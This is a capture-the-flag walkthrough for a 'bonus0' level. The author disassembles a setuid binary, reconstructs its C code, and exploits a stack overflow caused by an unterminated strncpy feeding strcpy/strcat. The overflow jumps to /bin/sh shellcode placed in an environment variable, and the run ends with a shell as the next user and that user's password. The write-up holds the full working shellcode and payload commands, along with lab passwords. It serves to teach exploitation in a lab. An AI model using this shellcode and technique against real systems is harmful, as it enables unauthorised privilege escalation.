# Bonus 0

## Requirements

- None

## Walkthrough

1. Login

    ```bash
    > ssh -p 4242 bonus0@192.168.1.66
    Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

    GCC stack protector support:            Enabled
    Strict user copy checks:                Disabled
    Restrict /dev/mem access:               Enabled
    Restrict /dev/kmem access:              Enabled
    grsecurity / PaX: No GRKERNSEC
    Kernel Heap Hardening: No KERNHEAP
    System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
    ```

2. Check files

    ```bash
    > ls -l
    total 8
    -rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0

    > ./bonus0 qwe asd
     -
    ewq
     -
    dsa
    ewq dsa

    > echo "qwe\ndsa" | ./bonus0
     -
     -
    Segmentation fault (core dumped)
    ```

3. Well, 2 inputs are asked, then printed out, nothing to fancy. GDB, I choose you!

    ```bash
    > gdb bonus0
    ...

    > (gdb) i functions
    (gdb) i functions
    All defined functions:

    Non-debugging symbols:
    0x08048334  _init
    0x08048380  read
    0x08048380  read@plt
    0x08048390  strcat
    0x08048390  strcat@plt
    0x080483a0  strcpy
    0x080483a0  strcpy@plt
    0x080483b0  puts
    0x080483b0  puts@plt
    0x080483c0  __gmon_start__
    0x080483c0  __gmon_start__@plt
    0x080483d0  strchr
    0x080483d0  strchr@plt
    0x080483e0  __libc_start_main
    0x080483e0  __libc_start_main@plt
    0x080483f0  strncpy
    0x080483f0  strncpy@plt
    0x08048400  _start
    0x08048430  __do_global_dtors_aux
    0x08048490  frame_dummy
    0x080484b4  p
    0x0804851e  pp
    0x080485a4  main
    0x080485d0  __libc_csu_init
    0x08048640  __libc_csu_fini
    0x08048642  __i686.get_pc_thunk.bx
    0x08048650  __do_global_ctors_aux
    0x0804867c  _fini
    ```

4. As usual, no too much. A `main` with 2 other functions `pp` and `p`.

    ```bash
    > (gdb) disas main
    Dump of assembler code for function main:
       0x080485a4 <+0>:	push   %ebp
       0x080485a5 <+1>:	mov    %esp,%ebp
       0x080485a7 <+3>:	and    $0xfffffff0,%esp
       0x080485aa <+6>:	sub    $0x40,%esp
       0x080485ad <+9>:	lea    0x16(%esp),%eax
       0x080485b1 <+13>:	mov    %eax,(%esp)
       0x080485b4 <+16>:	call   0x804851e <pp>
       0x080485b9 <+21>:	lea    0x16(%esp),%eax
       0x080485bd <+25>:	mov    %eax,(%esp)
       0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
       0x080485c5 <+33>:	mov    $0x0,%eax
       0x080485ca <+38>:	leave
       0x080485cb <+39>:	ret
    End of assembler dump.

    > (gdb) disas pp
    Dump of assembler code for function pp:
       0x0804851e <+0>:	push   %ebp
       0x0804851f <+1>:	mov    %esp,%ebp
       0x08048521 <+3>:	push   %edi
       0x08048522 <+4>:	push   %ebx
       0x08048523 <+5>:	sub    $0x50,%esp
       0x08048526 <+8>:	movl   $0x80486a0,0x4(%esp)
       0x0804852e <+16>:	lea    -0x30(%ebp),%eax
       0x08048531 <+19>:	mov    %eax,(%esp)
       0x08048534 <+22>:	call   0x80484b4 <p>
       0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
       0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
       0x08048544 <+38>:	mov    %eax,(%esp)
       0x08048547 <+41>:	call   0x80484b4 <p>
       0x0804854c <+46>:	lea    -0x30(%ebp),%eax
       0x0804854f <+49>:	mov    %eax,0x4(%esp)
       0x08048553 <+53>:	mov    0x8(%ebp),%eax
       0x08048556 <+56>:	mov    %eax,(%esp)
       0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
       0x0804855e <+64>:	mov    $0x80486a4,%ebx
       0x08048563 <+69>:	mov    0x8(%ebp),%eax
       0x08048566 <+72>:	movl   $0xffffffff,-0x3c(%ebp)
       0x0804856d <+79>:	mov    %eax,%edx
       0x0804856f <+81>:	mov    $0x0,%eax
       0x08048574 <+86>:	mov    -0x3c(%ebp),%ecx
       0x08048577 <+89>:	mov    %edx,%edi
       0x08048579 <+91>:	repnz scas %es:(%edi),%al
       0x0804857b <+93>:	mov    %ecx,%eax
       0x0804857d <+95>:	not    %eax
       0x0804857f <+97>:	sub    $0x1,%eax
       0x08048582 <+100>:	add    0x8(%ebp),%eax
       0x08048585 <+103>:	movzwl (%ebx),%edx
       0x08048588 <+106>:	mov    %dx,(%eax)
       0x0804858b <+109>:	lea    -0x1c(%ebp),%eax
       0x0804858e <+112>:	mov    %eax,0x4(%esp)
       0x08048592 <+116>:	mov    0x8(%ebp),%eax
       0x08048595 <+119>:	mov    %eax,(%esp)
       0x08048598 <+122>:	call   0x8048390 <strcat@plt>
       0x0804859d <+127>:	add    $0x50,%esp
       0x080485a0 <+130>:	pop    %ebx
       0x080485a1 <+131>:	pop    %edi
       0x080485a2 <+132>:	pop    %ebp
       0x080485a3 <+133>:	ret
    End of assembler dump.

    > (gdb) disas p
    Dump of assembler code for function p:
       0x080484b4 <+0>:	push   %ebp
       0x080484b5 <+1>:	mov    %esp,%ebp
       0x080484b7 <+3>:	sub    $0x1018,%esp
       0x080484bd <+9>:	mov    0xc(%ebp),%eax
       0x080484c0 <+12>:	mov    %eax,(%esp)
       0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
       0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
       0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
       0x080484d6 <+34>:	mov    %eax,0x4(%esp)
       0x080484da <+38>:	movl   $0x0,(%esp)
       0x080484e1 <+45>:	call   0x8048380 <read@plt>
       0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
       0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
       0x080484f4 <+64>:	mov    %eax,(%esp)
       0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
       0x080484fc <+72>:	movb   $0x0,(%eax)
       0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
       0x08048505 <+81>:	movl   $0x14,0x8(%esp)
       0x0804850d <+89>:	mov    %eax,0x4(%esp)
       0x08048511 <+93>:	mov    0x8(%ebp),%eax
       0x08048514 <+96>:	mov    %eax,(%esp)
       0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
       0x0804851c <+104>:	leave
       0x0804851d <+105>:	ret
    End of assembler dump.
    ```

5. Pseudo-code using IDA and some manual refactoring.

    ```c
    char * p(char * input, char * separator)
    {
      char chunk[4104]; // [esp+10h] [ebp-1008h] BYREF

      puts(separator);
      read(0, chunk, 4096);

      *strchr(chunk, '\n') = '\0';

      return strncpy(input, chunk, 20);
    }

    char * pp(char * buffer)
    {
      char input_1[20]; // [esp+28h] [ebp-30h] BYREF
      char input_2[28]; // [esp+3Ch] [ebp-1Ch] BYREF

      p(input_1, " - ");
      p(input_2, " - ");

      strcpy(buffer, input_1);

      buffer[strlen(buffer)] = ' ';

      return strcat(buffer, input_2);
    }

    int main(int argc, const char **argv, const char **envp)
    {
      char buffer[42]; // [esp+16h] [ebp-2Ah] BYREF

      pp(buffer);
      puts(buffer);

      return 0;
    }
    ```

6. Ok, so, first of all, we don’t have any `system`, therefore, we are going to have to provide a ShellCode, let’s reuse the same as previously.

    ```bash
    # ShellCode (28 bytes)
    python -c "print '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'"
    ```

7. However, the `strncpy` is limited to `20` characters, so we aren’t going to be able to use it as input, hence another way would be to store it in an environment variable.

    ```bash
    > EXPLOIT=$(python -c "print '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'")
    ```

8. Now, we need to find its address to use it.

    ```bash
    	> EXPLOIT=$(python -c "print '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'") gdb bonus0
    ...

    > r
    Starting program: /home/user/bonus0/bonus0
     -
    AAAABBBBCCCCDDDDEEEEFFFFGGGG
     -
    aaaabbbbccccddddeeeeffffgggg
    AAAABBBBCCCCDDDDEEEEaaaabbbbccccddddeeee��� aaaabbbbccccddddeeee���

    Program received signal SIGSEGV, Segmentation fault.
    0x64636363 in ?? ()

    > (gdb) x/5s *environ
    0xbffff8e4:	 "EXPLOIT=1\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
    0xbffff909:	 "SHELL=/bin/bash"
    0xbffff919:	 "TERM=xterm-256color"
    0xbffff92d:	 "SSH_CLIENT=192.168.56.1 40012 4242"
    0xbffff950:	 "SSH_TTY=/dev/pts/0"
    ```

9. Was pretty easy. So, the address is `0xbffff8e4`, however, we have to strip the variable name, therefore, the shellcode address is `0xbffff8ec`.
10. Now we need the find the offset for the overflow. With the commands below, we get the `SIGSEGV` on `0x64636363` which is `cccd`, so we have an offset of `9` on the second argument.

    ```bash
    > gdb bonus0
    ...

    > (gdb) r
    Starting program: /home/user/bonus0/bonus0
     -
    AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
     -
    aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj
    AAAABBBBCCCCDDDDEEEEaaaabbbbccccddddeeee��� aaaabbbbccccddddeeee���

    Program received signal SIGSEGV, Segmentation fault.
    0x64636363 in ?? ()
    ```

11. Fine, now we have to find an exploit by understanding the program flow.
    1. A first input `read` from `stdin`, replacing the `\n` by `\0`
    2. The input is copied into the `input_1` buffer using `strncpy` which can be exploited by providing an input larger than the limit (20 bytes here), making it not null terminated (no `\0` is added)
    3. Repeat steps `a` and `b` for a second input
    4. The first `input_1` buffer is copied into a `main` buffer (up to the first `\0` found, therefore if the input was larger than the 20 bytes allowed, `strcpy` will continue reading the stack)
    5. The `\0` in the main buffer is replaced by a `space` making it not null  terminated too
    6. The second input `input_2` is concatenated using `strcat` to the `main` buffer
    7. Finally, the buffer is printed using `puts`
12. Perfect, we can try our first payload.

    ```bash
    "A" * 4095 + "\n" + "A" * 9 + "\xec\xf8\xff\xbf" +
    ^                   ^
    |                   Arg 2 (9 bytes of garbage data to reach the offset, followed by the address of the `shellcode`)
    Arg 1 (4095 bytes of garbage data + `\n` to fill the `read` buffer since we provide all-in-one input, otherwise the 2nd would be read by the same call to `read` as no EOF is emitted)
    ```

    ```bash
    > export EXPLOIT=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
    > gdb bonus0
    ...
    > (gdb) r < <(python -c 'print "A"*4095 + "\n" + "A"*9 + "\xec\xf8\xff\xbf" + "A"*8';cat)
    Starting program: /home/user/bonus0/bonus0 < <(python -c 'print "A"*4095 + "\n" + "A"*9 + "\xec\xf8\xff\xbf" + "A"*8';cat)
     -
     -
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
    process 3488 is executing new program: /bin/dash
    ls
    bonus0

    whoami
    bonus0
    pwd
    /home/user/bonus0
    ```

13. Amazing! Let’s try it out of GDB.

    ```bash
    > (python -c 'print "A"*4095 + "\n" + "A"*9 + "\xec\xf8\xff\xbf" + "A"*8'; cat) | ./bonus0
     -
     -
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
    ls
    Segmentation fault (core dumped)
    ```


14. Doesn’t work… After some research I found that the shellcode address might be the issue since environment variable addresses may change outside GDB. To test it, we can create a simple C program which will display it.

```c
// File: /tmp/getenv.c
#include <stdio.h>
#include <stdlib.h>

void main()
{
	printf("Address: %p\n", getenv("EXPLOIT"));
}
```

```bash
> cd /tmp
> gcc -o getenv getenv.c
> ./getenv EXPLOIT
Address: 0xbffff8f5
```

1. Indeed, environment variable address is different! Let’s retry with the new address! (Do not forget to add `8` to skip the variable name `EXPLOIT=`)

    ```bash
    > export EXPLOIT=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
    > (python -c 'print "A"*4095 + "\n" + "A"*9 + "\xfd\xf8\xff\xbf" + "A"*8'; cat) | ./bonus0
     -
     -
    AAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAA��� AAAAAAAA���AAAAAAA���
    ls
    ls: cannot open directory .: Permission denied
    pwd
    /home/user/bonus0
    whoami
    bonus1
    ```

2. Hooray! We did it! Get the flag!

    ```bash
    cat /home/user/bonus1/.pass
    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
    ```

## Documentation

- None
